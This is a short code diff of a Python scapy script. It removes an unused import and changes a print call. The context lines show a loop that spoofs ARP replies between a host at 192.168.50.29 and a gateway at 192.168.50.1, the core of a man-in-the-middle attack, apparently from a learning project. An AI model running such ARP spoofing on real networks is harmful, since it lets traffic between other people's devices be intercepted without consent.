@@ -1,4 +1,3 @@
-from calendar import c
 import scapy.all as scapy
 import time
 
@@ -20,7 +19,7 @@ while True:
     spoof("192.168.50.29", "192.168.50.1")
     spoof("192.168.50.1", "192.168.50.29")
     send_packets_count = send_packets_count + 2
-    print("[+] Packets sent: " + str(send_packets_count))
+    print("[+] Packets sent: " + str(send_packets_count), end="")
     time.sleep(2)
 
 
